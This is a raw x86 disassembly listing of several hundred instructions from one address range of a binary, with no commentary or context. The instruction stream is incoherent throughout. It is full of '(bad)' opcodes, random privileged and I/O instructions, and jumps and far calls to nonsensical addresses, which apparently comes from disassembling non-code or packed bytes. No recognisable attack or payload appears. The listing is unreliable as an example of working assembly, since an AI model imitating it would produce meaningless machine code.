  421247:	pop    ebx
  421248:	pop    ss
  421249:	ins    DWORD PTR es:[edi],dx
  42124a:	xchg   BYTE PTR [esi+eiz*1+0x5bde627b],ch
  421251:	retf   0x6016
  421254:	(bad)  [esi+0x2]
  421257:	ss popa 
  421259:	xor    bl,ah
  42125b:	shl    dh,1
  42125d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42125e:	inc    edx
  42125f:	sahf   
  421260:	(bad)  
  421261:	add    edi,DWORD PTR [edi+0x25]
  421264:	inc    ebp
  421265:	push   DWORD PTR [edx-0x3259395]
  42126b:	sar    BYTE PTR [eax-0x68093398],cl
  421271:	push   es
  421272:	scas   eax,DWORD PTR es:[edi]
  421273:	lods   eax,DWORD PTR ds:[esi]
  421274:	jle    0x4212bc
  421276:	mov    edx,0xdd6c4547
  42127b:	dec    ebx
  42127c:	or     ecx,DWORD PTR [ebx]
  42127e:	call   0x23c0990b
  421283:	mov    esi,0x9057128a
  421288:	xor    al,0xe1
  42128a:	repz test eax,0x79c61bce
  421290:	mov    dh,0x63
  421292:	shl    BYTE PTR [edx+0x48],0x54
  421296:	loope  0x42126e
  421298:	jb     0x4212ce
  42129a:	add    eax,0xdf90ff2e
  42129f:	push   cs
  4212a0:	leave  
  4212a1:	mov    esi,0xda823f1
  4212a6:	dec    edx
  4212a7:	(bad)  
  4212a8:	xor    bh,BYTE PTR [edx+0x34]
  4212ab:	imul   esi,DWORD PTR [ebx+0x9],0x269f67a6
  4212b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212b3:	or     esi,DWORD PTR [eax-0x2b25bd9b]
  4212b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212ba:	xchg   ah,dh
  4212bc:	mov    bh,0xb
  4212be:	xor    DWORD PTR [ebx],esi
  4212c0:	lea    esi,[edx]
  4212c2:	add    esi,ebp
  4212c4:	(bad)  
  4212c5:	cli    
  4212c6:	xchg   edi,eax
  4212c7:	pop    eax
  4212c8:	dec    ebx
  4212c9:	or     al,0x83
  4212cb:	adc    eax,esp
  4212cd:	(bad)  [edi+eiz*2+0x58]
  4212d1:	push   edx
  4212d2:	and    BYTE PTR [edx+0x7b],ch
  4212d5:	xor    DWORD PTR [edi+0x4],esi
  4212d8:	fimul  WORD PTR [esi+0x4b]
  4212db:	mov    ch,0xc9
  4212dd:	mov    DWORD PTR [edi],ebx
  4212df:	dec    edi
  4212e0:	(bad)  
  4212e1:	div    DWORD PTR [ecx+ecx*1+0x56feba42]
  4212e8:	pop    edx
  4212e9:	cld    
  4212ea:	pop    esp
  4212ec:	rcl    DWORD PTR [eax+0x22],0x2f
  4212f0:	jecxz  0x421370
  4212f2:	jmp    0x42127e
  4212f4:	or     DWORD PTR [ecx+0x5879c0b2],esi
  4212fa:	pop    edi
  4212fb:	jo     0x4212ee
  4212fd:	pop    esp
  4212fe:	out    dx,al
  4212ff:	ds out 0x3c,eax
  421302:	jl     0x421307
  421304:	fidivr DWORD PTR [eax]
  421306:	mov    ah,0xd3
  421308:	push   ebx
  421309:	dec    edi
  42130a:	sbb    eax,0xa8eb2caa
  42130f:	pop    es
  421310:	stos   DWORD PTR es:[edi],eax
  421311:	cmp    eax,0xa67b6e10
  421316:	jo     0x42136a
  421318:	push   cs
  421319:	jecxz  0x421374
  42131b:	adc    bh,ah
  42131d:	pop    ds
  42131e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42131f:	adc    edx,DWORD PTR [edx-0x26110ea5]
  421325:	bound  ebp,QWORD PTR [ebx-0x54]
  421328:	adc    eax,0x84841aa2
  42132d:	sar    BYTE PTR [ebp+0x3b],0x60
  421331:	leave  
  421332:	aam    0xca
  421334:	bound  ebp,QWORD PTR [ebx+0x52]
  421337:	fbstp  TBYTE PTR [esi]
  421339:	pop    esp
  42133a:	jns    0x421370
  42133c:	repnz lock icebp 
  42133f:	fimul  DWORD PTR [ebx]
  421341:	push   0x9876c6dd
  421346:	mov    al,BYTE PTR [ecx+ebp*1-0x26]
  42134a:	cmp    al,0xc3
  42134c:	aad    0x33
  42134e:	inc    edx
  42134f:	imul   ecx,DWORD PTR [ebx+0xeb7bca0],0xfffffff7
  421356:	mov    eax,ds:0xf223ca89
  42135b:	(bad)  
  42135c:	aas    
  42135d:	xlat   BYTE PTR ds:[ebx]
  42135e:	je     0x42133b
  421360:	adc    al,0xc9
  421362:	push   esi
  421363:	(bad)  
  421365:	fnstcw WORD PTR [eax+0x7c]
  421368:	xlat   BYTE PTR ds:[ebx]
  421369:	popf   
  42136a:	scas   al,BYTE PTR es:[edi]
  42136b:	jl     0x4213ae
  42136d:	pop    edx
  42136e:	pop    esp
  42136f:	lea    edi,[edi]
  421371:	scas   al,BYTE PTR es:[edi]
  421372:	bound  eax,QWORD PTR [esi-0x3b]
  421375:	pop    ecx
  421376:	leave  
  421377:	or     DWORD PTR [esi+0x14269598],edx
  42137d:	repnz add eax,0x245caa4
  421383:	aam    0x65
  421385:	data16 (bad) 
  421387:	int    0x29
  421389:	push   ss
  42138a:	retf   0xda45
  42138d:	out    0x19,al
  42138f:	daa    
  421390:	dec    ecx
  421391:	retf   
  421392:	sti    
  421393:	xchg   ebp,eax
  421394:	test   BYTE PTR [ebx],0xa0
  421397:	xor    ecx,eax
  421399:	cmp    bh,0xa3
  42139c:	mov    eax,0x1658f5ec
  4213a1:	push   esp
  4213a2:	pusha  
  4213a3:	jp     0x42134d
  4213a5:	mov    esi,esi
  4213a7:	xor    ah,BYTE PTR [esi+0x11ab11f6]
  4213ad:	in     eax,dx
  4213ae:	pop    ss
  4213af:	in     al,0x2e
  4213b1:	rol    BYTE PTR [ecx],1
  4213b3:	mov    ch,0x49
  4213b5:	fs es dec ecx
  4213b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213b9:	pop    eax
  4213ba:	and    ch,BYTE PTR [edx-0x39]
  4213bd:	push   esi
  4213be:	fstp   QWORD PTR [ebx-0x364ff8f6]
  4213c4:	daa    
  4213c5:	xchg   ecx,eax
  4213c6:	pop    es
  4213c7:	push   0x49
  4213c9:	enter  0xef63,0x7c
  4213cd:	or     eax,0x4705d670
  4213d2:	ss (bad) 
  4213d4:	jge    0x4213a6
  4213d6:	jp     0x42138d
  4213d8:	retf   
  4213d9:	sahf   
  4213da:	rol    BYTE PTR [ebx+0x71],1
  4213dd:	std    
  4213de:	(bad)  
  4213df:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213e1:	xchg   ebx,eax
  4213e2:	mov    bh,dl
  4213e4:	dec    esp
  4213e5:	mov    dl,0xec
  4213e7:	lea    eax,[edx+ecx*8+0x656b170d]
  4213ee:	shl    DWORD PTR es:[eax-0x72],0x29
  4213f3:	or     DWORD PTR [ecx+0x2c],edi
  4213f6:	xchg   ecx,eax
  4213f7:	fimul  DWORD PTR [ecx+eiz*4]
  4213fa:	mov    bl,0xac
  4213fc:	dec    eax
  4213fd:	aas    
  4213fe:	sbb    eax,0x8b46fd51
  421403:	inc    edx
  421404:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421405:	xchg   edi,eax
  421406:	sub    DWORD PTR ds:0x4760a07d,ecx
  42140c:	pop    esp
  42140d:	sbb    al,0xa8
  42140f:	cwde   
  421410:	push   ss
  421411:	rcl    BYTE PTR [ecx-0x38737944],cl
  421417:	or     al,0xdf
  421419:	jmp    0x42146d
  42141b:	add    eax,DWORD PTR [ebx]
  42141d:	nop
  42141e:	and    eax,0xed7ea490
  421423:	push   eax
  421424:	scas   al,BYTE PTR es:[edi]
  421425:	add    eax,0x4961e6b6
  42142a:	dec    ebp
  42142b:	out    0x89,al
  42142d:	(bad)  
  42142f:	sub    dh,BYTE PTR [ebx]
  421431:	push   0xffffffcc
  421433:	cwde   
  421434:	sbb    ecx,DWORD PTR [ebx+0xa5a465d]
  42143a:	out    dx,al
  42143b:	test   eax,0x4755d898
  421440:	mov    ch,0x69
  421442:	pop    ss
  421443:	shr    edx,1
  421445:	sbb    DWORD PTR [edi+edi*2],edi
  421448:	mov    cl,0xfd
  42144a:	(bad)  
  42144c:	aaa    
  42144d:	stos   BYTE PTR es:[edi],al
  42144e:	rdmsr  
  421450:	mov    DWORD PTR [ecx+0x6e],ecx
  421453:	mov    dl,0xf8
  421455:	mov    esi,fs
  421457:	imul   ebx,DWORD PTR [edx-0x3c862b68],0x259750d5
  421461:	daa    
  421462:	push   ebx
  421463:	add    edx,DWORD PTR [edx+ebx*4+0x5e]
  421467:	pop    esi
  421468:	xor    ebx,DWORD PTR [edi+0x15aae8f]
  42146e:	sbb    BYTE PTR [edi-0xc],0x24
  421472:	add    eax,0xc464d9a6
  421477:	int3   
  421478:	sar    DWORD PTR [edi+0x3],1
  42147b:	arpl   WORD PTR ds:0x74c0db82,bp
  421481:	int3   
  421482:	jns    0x421480
  421484:	xchg   edi,eax
  421485:	outs   dx,BYTE PTR ds:[esi]
  421486:	xchg   esp,eax
  421487:	scas   al,BYTE PTR es:[edi]
  421488:	dec    esi
  421489:	adc    DWORD PTR [eax-0x3],edi
  42148c:	mov    ebx,0x98b597ca
  421491:	lahf   
  421492:	adc    BYTE PTR [ebx+0x55c706ec],al
  421498:	inc    ebx
  421499:	jns    0x42144b
  42149b:	stos   DWORD PTR es:[edi],eax
  42149c:	mov    edx,0x6d885847
  4214a1:	stos   BYTE PTR es:[edi],al
  4214a2:	rcl    bh,0xd
  4214a5:	push   ss
  4214a6:	test   eax,0x8d93de38
  4214ab:	aam    0xcc
  4214ad:	int3   
  4214ae:	outs   dx,DWORD PTR ds:[esi]
  4214af:	stc    
  4214b0:	pop    ebx
  4214b1:	js     0x4214d6
  4214b3:	adc    ah,ah
  4214b5:	pop    esi
  4214b6:	cs jae 0x4214f2
  4214b9:	push   ebp
  4214ba:	mov    ecx,0x33f9fec8
  4214bf:	jnp    0x42147b
  4214c1:	clc    
  4214c2:	xchg   BYTE PTR [eax-0x7d5d4204],dh
  4214c8:	mov    edx,0x5ffe7e5b
  4214cd:	dec    ebx
  4214ce:	hlt    
  4214cf:	push   ss
  4214d0:	cmp    DWORD PTR [ecx],esp
  4214d2:	adc    al,0xf6
  4214d4:	stos   DWORD PTR es:[edi],eax
  4214d5:	in     al,0xba
  4214d7:	pushf  
  4214d8:	test   BYTE PTR [ecx-0x2b],dl
  4214db:	or     DWORD PTR [ecx+0x47],edx
  4214de:	iret   
  4214df:	xchg   edi,eax
  4214e0:	adc    DWORD PTR [edx],ebx
  4214e2:	mov    ecx,0x7700e290
  4214e7:	enter  0xc3c9,0xbb
  4214eb:	popa   
  4214ec:	pop    ebx
  4214ed:	or     bl,bl
  4214ef:	jg     0x42154a
  4214f1:	mov    ah,0xdb
  4214f3:	jmp    DWORD PTR [edx+ebp*4]
  4214f6:	lock jge 0x421519
  4214f9:	sub    DWORD PTR [ecx-0x32bbc5ce],esi
  4214ff:	das    
  421500:	jmp    0x42157b
  421502:	lock (bad) 
  421504:	inc    DWORD PTR [edi-0x5f6ea09]
  42150a:	dec    DWORD PTR [esi]
  42150c:	jecxz  0x42153a
  42150e:	fcmovnbe st,st(7)
  421510:	jmp    0x421582
  421512:	xchg   DWORD PTR [ecx-0xa415091],ecx
  421518:	jne    0x42151b
  42151a:	js     0x4214e4
  42151c:	arpl   WORD PTR [edx+0x4a9af126],sp
  421522:	cld    
  421523:	dec    ecx
  421524:	push   esi
  421525:	sbb    eax,0xc79ca138
  42152a:	dec    esp
  42152b:	scas   al,BYTE PTR es:[edi]
  42152c:	hlt    
  42152d:	mov    bl,0x5b
  42152f:	sub    BYTE PTR [ebx],cl
  421531:	lods   eax,DWORD PTR ds:[esi]
  421532:	xchg   DWORD PTR [ebp+esi*8+0x5e],ebx
  421536:	lods   eax,DWORD PTR ds:[esi]
  421537:	fxch   st(2)
  421539:	mov    ebp,0x6779230f
  42153e:	repz repz fs xchg ebx,eax
  421542:	aam    0x5f
  421544:	scas   eax,DWORD PTR es:[edi]
  421545:	neg    al
  421547:	(bad)  
  421548:	push   edi
  421549:	loop   0x4215b5
  42154b:	aad    0x46
  42154d:	ins    BYTE PTR es:[edi],dx
  42154e:	das    
  42154f:	scas   al,BYTE PTR es:[edi]
  421550:	imul   ebp,DWORD PTR [ebx-0x7d],0xffffff85
  421554:	(bad)  
  421556:	push   ebx
  421557:	push   eax
  421558:	xor    ebx,esi
  42155a:	(bad)
  42155e:	loope  0x421536
  421560:	ins    DWORD PTR es:[edi],dx
  421561:	cmc    
  421562:	and    DWORD PTR [esi+0x0],edi
  421568:	add    BYTE PTR [eax],al
  42156a:	push   edi
  42156b:	pop    edx
  42156c:	dec    edx
  42156d:	inc    esi
  42156e:	dec    edi
  42156f:	push   esi
  421570:	pop    edi
  421571:	pop    ebx
  421572:	push   esp
  421573:	inc    eax
  421574:	cmp    eax,0x59aa92b5
  421579:	outs   dx,DWORD PTR ds:[esi]
  42157a:	pop    esp
  42157b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42157c:	add    DWORD PTR [eax],eax
  42157e:	add    BYTE PTR [esi],0x0
  421581:	add    BYTE PTR [ebx+ebx*4-0x49],cl
  421585:	sub    ebx,DWORD PTR [edx+0x4ecbf62a]
  42158b:	dec    ebx
  42158c:	xchg   BYTE PTR [ebp+0x60],al
  42158f:	adc    edi,0x244665e3
  421595:	addr16 cmp eax,0x583c2e24
  42159b:	ret    0x92a8
  42159e:	stos   BYTE PTR es:[edi],al
  42159f:	push   edi
  4215a0:	ja     0x42157b
  4215a2:	not    BYTE PTR [esi+0x485f5e2e]
  4215a8:	xchg   ebp,eax
  4215a9:	shl    BYTE PTR [edx],0x95
  4215ac:	xchg   BYTE PTR [edx+eiz*4-0x60],bh
  4215b0:	(bad)
  4215b3:	(bad)  
  4215b4:	xor    al,0x4
  4215b6:	xacquire xchg DWORD PTR [edi],esp
  4215b9:	iret   
  4215ba:	stc    
  4215bb:	cwde   
  4215bc:	pop    ecx
  4215bd:	pushf  
  4215be:	dec    ebx
  4215bf:	js     0x42157c
  4215c1:	aaa    
  4215c2:	ds icebp 
  4215c4:	dec    eax
  4215c5:	jge    0x421585
  4215c7:	popf   
  4215c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215c9:	fistp  DWORD PTR [ebx-0x2c5c71]
  4215cf:	push   eax
  4215d0:	das    
  4215d1:	test   al,0x34
  4215d3:	jmp    0xcb58:0x1d3c6069
  4215da:	sbb    eax,0x7b90824
  4215df:	sbb    dh,al
  4215e1:	(bad)  
  4215e2:	cli    
  4215e3:	ds xchg esp,eax
  4215e5:	push   eax
  4215e6:	xor    esi,DWORD PTR [edx-0x21]
  4215e9:	jmp    DWORD PTR [edx+0x739cb003]
  4215ef:	sub    DWORD PTR [eax+0x492fe570],edx
  4215f5:	rcr    DWORD PTR [ebp+0x56],cl
  4215f8:	out    dx,eax
  4215f9:	jge    0x421596
  4215fb:	or     eax,0xbec45f35
  421600:	(bad)  
  421601:	not    edi
  421603:	clc    
  421604:	enterw 0x47fe,0xe2
  421609:	nop
  42160a:	inc    ecx
  42160b:	iret   
  42160c:	pusha  
  42160d:	mov    esi,0xca5b1543
  421612:	mov    esi,0xfe2174b
  421617:	std    
  421618:	adc    DWORD PTR [ebp+0x1d],0x8b9c6fee
  42161f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421620:	inc    ecx
  421621:	mov    ah,0x5a
  421623:	mov    ebp,ebx
  421625:	cwde   
  421626:	xlat   BYTE PTR ds:[ebx]
  421627:	mov    ds:0xbc83c128,al
  42162c:	mov    dl,0x88
  42162e:	and    DWORD PTR [esi+0x6f526e2d],0x61
  421635:	adc    eax,0xe475edee
  42163a:	enter  0x224f,0x7f
  42163e:	mov    ds:0x4ff21594,eax
  421643:	cmp    DWORD PTR [ecx+0x3676804],esp
  421649:	clc    
  42164a:	fdivr  st(3),st
  42164c:	add    eax,0xda4c7790
  421651:	les    ecx,FWORD PTR [ebx]
  421653:	sbb    DWORD PTR [ecx],0xffffff82
  421656:	jle    0x421612
  421658:	sub    esi,DWORD PTR [eax-0x26]
  42165b:	mov    ebp,0xe4e520fc
  421660:	adc    al,0x21
  421662:	(bad)  
  421663:	ror    esi,1
  421665:	or     BYTE PTR [ecx],0xa
  421668:	pushw  0xff9e
  42166b:	pop    ebp
  42166c:	mov    edi,edi
  42166e:	fsubr  DWORD PTR [ebx]
  421670:	les    ebp,FWORD PTR [eax+0x15]
  421673:	push   ebx
  421674:	mov    ecx,0x32c1ecdf
  421679:	or     DWORD PTR [esi-0x1d139c3e],0x63c7d320
  421683:	jne    0x42169f
  421685:	mov    bh,0x78
  421687:	mov    ds,WORD PTR [ebx-0x3e]
  42168a:	repnz and esi,DWORD PTR [edx-0x60]
  42168e:	ss jmp 0x6738:0x32d302c1
  421696:	outs   dx,DWORD PTR ds:[esi]
  421697:	mov    edi,0xe128eee1
  42169c:	push   eax
  42169d:	sub    eax,0x85d770f4
  4216a2:	dec    ebx
  4216a3:	stos   DWORD PTR es:[edi],eax
  4216a4:	loop   0x4216b5
  4216a6:	pop    edi
  4216a7:	ror    ecx,0xc
  4216aa:	addr16 retf 0x8dc7
  4216ae:	jbe    0x421706
  4216b0:	test   eax,0x826ceac7
  4216b5:	mov    ah,0x20
  4216b7:	gs dec ebp
  4216b9:	call   0xc9a0:0x879c5e98
  4216c0:	imul   edx,DWORD PTR [edx+edx*2-0x7],0x55
  4216c5:	out    0x48,eax
  4216c7:	inc    eax
  4216c8:	popf   
  4216c9:	call   0xa2b7fb45
  4216ce:	mov    edx,0xae972bd7
  4216d3:	mov    dl,0xfc
  4216d5:	idiv   BYTE PTR [esi-0x2ccf7eb7]
  4216db:	xchg   edx,eax
  4216dc:	retf   0x7968
  4216df:	(bad)  
  4216e0:	jmp    0xb5c:0xe466f5d3
  4216e7:	test   al,0xaa
  4216e9:	call   DWORD PTR [edx+0x15b3647d]
  4216ef:	in     al,0x82
  4216f1:	loop   0x421707
  4216f3:	sub    al,0x67
  4216f5:	sbb    edx,DWORD PTR [ebx+0x672b00ac]
  4216fb:	ja     0x4216fa
  4216fd:	aas    
  4216fe:	sub    BYTE PTR [ecx+0x2b3fee60],ah
  421704:	mov    ebx,0x7182cb3b
  421709:	lds    eax,FWORD PTR [edi-0x67]
  42170c:	mov    esp,0x71985642
  421711:	inc    edi
  421712:	push   0x38f11f8a
  421717:	xchg   DWORD PTR [ebx],eax
  421719:	int    0xef
  42171b:	dec    ebx
  42171c:	gs jns 0x421768
  42171f:	std    
  421720:	adc    bh,ch
  421722:	push   esp
  421723:	xor    DWORD PTR [edi],ebp
  421725:	mov    ch,0x17
  421727:	es xchg esi,eax
  421729:	jae    0x421794
  42172b:	or     al,0x32
  42172d:	cmc    
  42172e:	mov    cl,0xf1
  421730:	or     DWORD PTR [ebx+0x40],edi
  421733:	cmp    al,al
  421735:	sbb    eax,0x880b162
  42173a:	add    ch,al
  42173c:	xlat   BYTE PTR ds:[ebx]
  42173d:	mov    WORD PTR [eax+0xdfcd205],gs
  421743:	mov    dh,0x98
  421745:	aas    
  421746:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421747:	cmp    BYTE PTR [ecx+0x42e35287],al
  42174d:	imul   eax,DWORD PTR [eax+0x6d],0x3f2f4d3e
  421754:	call   0x6758:0x394bbd38
  42175b:	mul    esi
  42175d:	lds    eax,FWORD PTR [ecx+0x54]
  421760:	dec    ebp
  421761:	out    dx,eax
  421762:	jg     0x421789
  421764:	aam    0x63
  421766:	jg     0x4217ca
  421768:	rol    BYTE PTR [ebp+0x7b],cl
  42176b:	jmp    0x4c5633ab
  421770:	pop    ebx
  421771:	mov    dl,0xd0
  421773:	imul   ecx,esi,0xac28b7a2
  421779:	stos   DWORD PTR es:[edi],eax
  42177a:	adc    BYTE PTR [esi+eiz*2-0x4d],ah
  42177e:	cmp    eax,0x28ef750e
  421783:	or     BYTE PTR [eax+esi*8+0x6e6690a1],dl
  42178a:	mov    edi,0xb564b95d
  42178f:	jl     0x4217a9
  421791:	xchg   edx,eax
  421792:	fidiv  WORD PTR [eax-0x6073d53]
  421798:	inc    esi
  421799:	mov    edi,ebp
  42179b:	in     eax,dx
  42179c:	jne    0x4217e7
  42179e:	and    BYTE PTR [edx+0x4a8ab99a],0xd2
  4217a5:	out    dx,al
  4217a6:	sub    ebp,DWORD PTR [ecx-0x35]
  4217a9:	js     0x42178a
  4217ab:	test   DWORD PTR [edx],edx
  4217ad:	push   ds
  4217ae:	xor    BYTE PTR [eax],ch
  4217b0:	popa   
  4217b1:	pusha  
  4217b2:	jp     0x421760
  4217b4:	jne    0x42179a
  4217b6:	loopne 0x4217cf
  4217b8:	ficomp DWORD PTR [edx]
  4217ba:	ss out dx,al
  4217bc:	cmp    eax,0xf3f4ed11
  4217c1:	xchg   ebp,eax
  4217c2:	cwde   
  4217c3:	cmp    dh,bl
  4217c5:	push   edx
  4217c6:	xor    eax,0x41645027
  4217cb:	ins    DWORD PTR es:[edi],dx
  4217cc:	or     DWORD PTR [di+0x22],ebx
  4217d0:	mov    fs,WORD PTR [eax+0x78]
  4217d3:	(bad)  
  4217d5:	push   ebx
  4217d6:	push   0x7105c31c
  4217db:	sbb    al,0xbc
  4217dd:	and    DWORD PTR [ecx-0x4eee3b25],0xffffff96
  4217e4:	mov    cs:0x1e066187,eax
  4217ea:	inc    ecx
  4217eb:	xor    BYTE PTR [edi],0x1e
  4217ee:	test   dl,cl
  4217f0:	pop    ss
  4217f1:	pop    ss
  4217f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217f3:	stos   BYTE PTR es:[edi],al
  4217f4:	test   BYTE PTR [ecx+0x1c],ah
  4217f7:	mov    esp,0xac4d649b
  4217fc:	inc    esp
  4217fd:	bound  eax,QWORD PTR [edx+eiz*2]
  421800:	cmc    
  421801:	jbe    0x42187a
  421803:	sub    ebx,edi
  421805:	dec    ebp
  421806:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421807:	not    DWORD PTR [esi+0x5]
  42180a:	sub    al,0x2e
  42180c:	mov    bh,0x10
  42180e:	cmp    al,BYTE PTR [edx-0x6efc7d6c]
  421814:	add    BYTE PTR [edi-0x71],dh
  421817:	sub    ebp,DWORD PTR [ebp-0x52]
  42181a:	rcr    bl,cl
  42181c:	stc    
  42181d:	stc    
  42181e:	dec    edi
  42181f:	pop    ss
  421820:	sub    ah,BYTE PTR [edx+0x6ce8f3a8]
  421826:	xchg   edx,eax
  421827:	sbb    DWORD PTR [ebp+0x368e593f],esp
  42182d:	pop    esi
  42182e:	adc    al,0x19
  421830:	(bad)  
  421831:	jp     0x42181a
  421833:	lahf   
  421834:	dec    edx
  421835:	in     eax,dx
  421836:	sbb    al,0x41
  421838:	ss int 0x46
  42183b:	test   BYTE PTR [esi+0x39],al
  42183e:	jnp    0x42180f
  421840:	in     al,dx
  421841:	jb     0x421881
  421843:	(bad)  
  421844:	iret   
  421845:	jbe    0x421834
  421847:	and    bh,BYTE PTR [esi+0x3bbbfb28]
  42184d:	cmc    
  42184e:	fs stos DWORD PTR es:[edi],eax
  421850:	cmp    edx,edi
  421852:	dec    edi
  421853:	mov    ebx,DWORD PTR [edx]
  421855:	std    
  421856:	sub    eax,0xf459ca3
  42185b:	sub    DWORD PTR [ebx+0x2f],0xf533d725
  421862:	adc    cl,bh
  421864:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421865:	rcr    DWORD PTR [edi+eiz*4+0x24f7f059],1
  42186c:	sbb    esi,DWORD PTR [edi-0x3a]
  42186f:	(bad)  
  421870:	xlat   BYTE PTR ds:[ebx]
  421871:	shl    BYTE PTR [eax],0xe6
  421874:	push   ds
  421875:	jb     0x421887
  421877:	test   DWORD PTR [ebp-0x47],ecx
  42187a:	ins    DWORD PTR es:[edi],dx
  42187b:	xchg   ebp,eax
  42187c:	(bad)  
  42187e:	cmp    BYTE PTR [edi-0x2a],dl
  421881:	mov    ds,WORD PTR [ecx]
  421883:	pop    eax
  421884:	mov    ebp,?
  421886:	sub    eax,0x53ac1b57
  42188b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42188c:	(bad)  
  42188d:	stos   DWORD PTR es:[edi],eax
  42188e:	pop    edx
  42188f:	lods   al,BYTE PTR ds:[esi]
  421890:	repnz int 0xec
  421893:	in     eax,0x37
  421895:	rcl    DWORD PTR [eax-0x21af1363],0x2d
  42189c:	adc    DWORD PTR [ecx+0x20f51918],ecx
  4218a2:	fisttp QWORD PTR [ebx+0x67e2fa63]
  4218a8:	les    esp,FWORD PTR [ebp-0x570ea9f0]
  4218ae:	int3   
  4218af:	xchg   ebx,eax
  4218b0:	call   0x40fffdd
  4218b5:	int    0x16
  4218b7:	jp     0x4218a8
  4218b9:	cmp    ch,cl
  4218bb:	mov    ebx,0xb9adc741
  4218c0:	das    
  4218c1:	fidiv  WORD PTR [edi+0x526ffc27]
  4218c7:	iret   
  4218c8:	pavgw  mm1,QWORD PTR [edi-0x190931ed]
  4218cf:	xchg   edx,eax
  4218d0:	(bad)  
  4218d2:	out    dx,eax
  4218d3:	mov    al,ds:0x46ca545d
  4218d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218d9:	(bad)  
  4218db:	push   ebx
  4218dc:	inc    edi
  4218dd:	div    DWORD PTR [edx-0x52]
  4218e0:	jmp    0x42192b
  4218e2:	add    eax,DWORD PTR [eax+edx*4-0x15]
  4218e6:	pop    ss
  4218e7:	sahf   
  4218e8:	inc    eax
  4218e9:	ss cmp ebx,esp
  4218ec:	and    eax,0x65336679
  4218f1:	pop    esp
  4218f2:	je     0x421875
  4218f4:	jmp    0xba56:0xaace0a07
  4218fb:	fwait
  4218fc:	sti    
  4218fd:	or     BYTE PTR [eax+0x14935462],dh
  421903:	loopne 0x4218de
  421905:	cmp    DWORD PTR [edx],edx
  421907:	or     esp,eax
  421909:	outs   dx,BYTE PTR ds:[esi]
  42190a:	fwait
  42190b:	mul    edx
  42190d:	in     eax,0x2d
  42190f:	adc    al,BYTE PTR [esp+edi*8+0x14a62683]
  421916:	mov    esp,gs
  421918:	mov    ch,0x8c
  42191a:	inc    esi
  42191b:	pushf  
  42191c:	jle    0x421907
  42191e:	mov    al,ds:0xb2b65b1a
  421923:	fdiv   DWORD PTR ds:0xfffcdcde
  421929:	popf   
  42192a:	mov    DWORD PTR [edx],ebx
  42192c:	ret    0x8e41
  42192f:	and    al,0xa7
  421931:	and    dl,BYTE PTR [ebx]
  421933:	xlat   BYTE PTR ds:[ebx]
  421934:	imul   ecx,DWORD PTR [esi+0x29],0x74
  421938:	push   ds
  421939:	pop    ds
  42193a:	xor    BYTE PTR [ebx],dl
  42193c:	sub    eax,0x4a547aed
  421941:	and    BYTE PTR [edi+0x32],dh
  421944:	outs   dx,DWORD PTR ss:[esi]
  421946:	loope  0x4218d9
  421948:	sub    BYTE PTR [ebx],dl
  42194a:	or     DWORD PTR [ecx],edx
  42194c:	test   al,0xe
  42194e:	sar    DWORD PTR [edx],1
  421950:	sbb    DWORD PTR [edi+0x13a05d21],ecx
  421956:	push   ebp
  421957:	adc    al,0xe9
  421959:	mov    al,ds:0xe566e2fd
  42195e:	add    ecx,edi
  421960:	dec    ebp
  421961:	bound  esp,QWORD PTR [ebx-0x6189cab2]
  421967:	inc    ebp
  421968:	mov    ds:0xcc9e0e7e,eax
  42196d:	dec    esp
  42196e:	and    ah,0x2b
  421971:	pop    ebp
  421972:	xor    al,0x39
  421974:	dec    ecx
  421975:	cmp    ecx,DWORD PTR [esi]
  421977:	pushf  
  421978:	pop    edx
  421979:	ins    DWORD PTR es:[edi],dx
  42197a:	stos   DWORD PTR es:[edi],eax
  42197b:	cmp    eax,0x5d71457a
  421980:	or     cl,dl
  421982:	and    bh,0xfb
  421985:	es pop edx
  421987:	ror    BYTE PTR [ebp-0x33562585],0xb3
  42198e:	loopne 0x421936
  421990:	sub    DWORD PTR [ecx+0x4e],ebx
  421993:	cld    
  421994:	adc    dl,BYTE PTR [ecx-0x29]
  421997:	dec    eax
  421998:	pop    ecx
  421999:	sbb    BYTE PTR [bx+si+0x491b],bl
  42199e:	adc    eax,0x7d166179
  4219a3:	lods   eax,DWORD PTR ds:[esi]
  4219a4:	mov    ebp,0x27272819
  4219a9:	or     BYTE PTR [edi+0x24],0x9b
  4219ad:	js     0x421946
  4219af:	dec    eax
  4219b0:	or     ecx,ebx
  4219b2:	push   esp
  4219b3:	fdivr  QWORD PTR [edx-0xe]
  4219b6:	cld    
  4219b7:	hlt    
  4219b8:	das    
  4219b9:	jns    0x42195f
  4219bb:	aaa    
  4219bc:	mov    BYTE PTR [eax+0x1c060c5b],ch
  4219c2:	hlt    
  4219c3:	popf   
  4219c4:	sbb    ch,BYTE PTR [ebx-0x41]
  4219c7:	dec    ebx
  4219c8:	repz mov esi,0x7be7800f
  4219ce:	call   0x3fb1:0xd04a3bba
  4219d5:	pop    edi
  4219d6:	hlt    
  4219d7:	sbb    esp,DWORD PTR [esi-0x22e9303a]
  4219dd:	pop    ebp
  4219de:	xchg   ecx,eax
  4219df:	sub    eax,0xc5c58e90
  4219e4:	mov    esp,0x29e9f5bb
  4219e9:	lahf   
  4219ea:	mov    eax,0xbcb057f1
  4219ef:	or     al,BYTE PTR [ebx]
  4219f1:	or     DWORD PTR [eax-0x1a],edx
  4219f4:	iret   
  4219f5:	mul    BYTE PTR [edi-0x34]
  4219f8:	fs hlt 
  4219fa:	es jl  0x421a35
  4219fd:	mov    ebp,0xa140e7ef
  421a02:	adc    al,ah
  421a04:	sub    al,0x3a
  421a06:	push   eax
  421a07:	add    BYTE PTR [ecx],al
  421a09:	(bad)  
